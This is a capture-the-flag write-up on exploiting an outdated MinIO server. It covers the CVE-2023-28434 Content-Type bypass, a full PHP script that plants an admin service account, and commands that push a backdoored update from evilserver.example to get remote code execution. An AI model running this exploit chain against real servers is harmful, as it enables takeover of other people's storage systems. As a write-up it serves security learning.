# minioday - Real World CTF 6th (web, 11 solved, 290p)
## Introduction
minioday is a web task.

An archive containing a Dockerfile and minion data is given.

The container is using minio in version `RELEASE.2023-03-13T19-46-17Z`.

## Known vulnerabilities
By looking for information about that specific version of minio, one can find
the official [security advisory] from minio's blog.

The advisory mentions two vulnerabilities: [CVE-2023-28432] and
[CVE-2023-28434].

The first vulnerability leaks environment variables from the server.

Since they contain the username and password of the administrator account, an
attacker can use this account to log in and push a malicious update to take over
the machine.

This vulnerability is not exploitable because it requires clustering which has
not been enabled.

The second vulnerability is a privilege escalation that lets an account change
the instance's configuration.

In-depth explanation of these vulnerabilities can be found on Security Joes's
[blog post].

[security advisory]: https://blog.min.io/security-advisory-stackedcves/
[CVE-2023-28432]: https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q
[CVE-2023-28434]: https://github.com/minio/minio/security/advisories/GHSA-2pxw-r47w-4p8c
[blog post]: https://www.securityjoes.com/post/new-attack-vector-in-the-cloud-attackers-caught-exploiting-object-storage-services

## CVE-2023-28434
This vulnerability has been fixed by commit
67f4ba154a27a1b06e48bfabda38355a010dfca5.

The root cause of the bug is that the code does security checks if the
`Content-Type` header matches the `multipart/form-data*` regex.

This is not a valid regular expression. Or rather, it is one, but it does not do
what the developper intended. This regular expression matches the following
strings:
```
multipart/form-data
multipart/form-dat
```

As a result, it is possible to bypass some security checks while still keeping a
valid request by sending a request with a `Content-Type` header of
`multipart/form-datA`.

The reproducer has been commited to the repository with commit
09c733677a37104e155a887a85519c784c664a36.

```go
contentTypeHdr = strings.Replace(contentTypeHdr, "multipart/form-data", "multipart/form-datA", 1)
```

## Finding a valid account
The archive comes with a `data` folder.

This folder contains, among other things, a `.mino.sys/config` directory.

By looking into the configuration directory, it is possible to find a valid
service account:

```json
{
  "version": 1,
  "credentials": {
    "accessKey": "Vmd6q3aw2eOEmZ6l",
    "secretKey": "eeuG1b8vW15TPpaN1fP9funQJdDG5wQy",
    "sessionToken": "...",
    "expiration": "1970-01-01T00:00:00Z",
    "status": "on",
    "parentUser": "rwctf"
  },
  "updatedAt": "2023-11-15T05:38:23.652266083Z"
}
```

This account has enough rights to exploit the `CVE-2023-28434` privilege
escalation vulnerability.

## Privilege escalation
By looking at the reproducer, it is obvious that the issue is that an
unprivileged account can write in the `.minio.sys` bucket. This bucket contains
configuration files.

The easiest way to get full privileges on the instance is to create a new
service account with all privileges.

This file can be created on a local instance and then uploaded the remote
server. This is how the `identity.json` appendix has been created.

## Remote code execution
Fortunately, there exists a Github project called [evil_minio] that can be used
to get code execution from an administrator account.
It works by pushing a malicious update that contains a backdoor.

The upgrade is pushed by using the officiel `mc` binary.

```
$ ./mc alias set minio_rw http://47.251.10.169:35367 TFNS TheFlatNetworkSociety
Added `minio_rw` successfully.

$ ./mc admin update minio_rw http://evilserver.example/minio.RELEASE.2023-03-22T06-36-24Z.sha256sum -y
Server `minio_rw` updated successfully from 2023-03-13T19:46:17Z to 2023-03-22T06-36-24Z
```

```
$ curl 'http://47.251.10.169:35367/anything?alive=cat%20/flag'
rwctf{2506b026-2aff-409f-9842-2f30291b8085}
```

[evil_minio]: https://github.com/AbelChe/evil_minio

**Flag**: `rwctf{2506b026-2aff-409f-9842-2f30291b8085}`

## Appendices
### pwn.php
```php
<?php
const NAME = "Vmd6q3aw2eOEmZ6l";
const KEY  = "eeuG1b8vW15TPpaN1fP9funQJdDG5wQy";

function hmac(string $data, string $key) : string
{
	return hash_hmac("sha256", $data, $key, true);
}

function getKey(string $name, string $secret,
	string $date = "19700101", string $region = "us-east-1",
	string $service = "s3") : array
{
	$data  = [$date, $region, $service, "aws4_request"];
	$creds = implode("/", [$name, ...$data]);

	$key = "AWS4$secret";
	$key = array_reduce($data,
		fn(string $carry, string $item) : string => hmac($item, $carry),
		$key);

	return [$creds, $key];
}

[$creds, $key] = getKey(NAME, KEY);

// no conditions, expires in Y3K
$pol = base64_encode(json_encode([
	"expiration" => "3000-01-01T00:00:00Z",
//	"conditions" => [],
]));
$sig = bin2hex(hmac($pol, $key));

$POST = [
	// x-amz- stuff
	"x-amz-algorithm"  => "AWS4-HMAC-SHA256",
	"x-amz-credential" => $creds,
	"x-amz-signature"  => $sig,

	// file info
	"key"    => "config/iam/service-accounts/TFNS/identity.json",
	"policy" => $pol,
	"file"   => file_get_contents("identity.json"),
];

$curl = curl_init("http://127.0.0.1:9000/.minio.sys/");
curl_setopt_array($curl, [
	CURLOPT_USERAGENT  => "Mozilla",
	CURLOPT_VERBOSE    => true,
	CURLOPT_POSTFIELDS => $POST,
	CURLOPT_HTTPHEADER => [
		"Content-Type: multipart/form-datA",
	],
]);

curl_exec($curl);
```

### identity.json
```json
{
  "version": 1,
  "credentials": {
    "accessKey": "TFNS",
    "secretKey": "TheFlatNetworkSociety",
    "sessionToken": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiJURk5TIiwicGFyZW50IjoicndjdGYiLCJzYS1wb2xpY3kiOiJlbWJlZGRlZC1wb2xpY3kiLCJzZXNzaW9uUG9saWN5IjoiZXlKV1pYSnphVzl1SWpvaU1qQXhNaTB4TUMweE55SXNJbE4wWVhSbGJXVnVkQ0k2VzNzaVJXWm1aV04wSWpvaVFXeHNiM2NpTENKQlkzUnBiMjRpT2xzaVlXUnRhVzQ2S2lKZGZTeDdJa1ZtWm1WamRDSTZJa0ZzYkc5M0lpd2lRV04wYVc5dUlqcGJJbXR0Y3pvcUlsMTlMSHNpUldabVpXTjBJam9pUVd4c2IzY2lMQ0pCWTNScGIyNGlPbHNpY3pNNktpSmRMQ0pTWlhOdmRYSmpaU0k2V3lKaGNtNDZZWGR6T25Nek9qbzZLaUpkZlYxOSJ9.qG1bXMyb2S4V2SWz_s2NBeSZfEJ1omBA7N0JyZB8CMmRXutRgZpluQMFu7yR1h3t_F1Id7PXiUu_zoW2Qy1-sQ",
    "expiration": "1970-01-01T00:00:00Z",
    "status": "on",
    "parentUser": "rwctf"
  },
  "updatedAt": "2024-01-27T22:24:50.217765446Z"
}
```
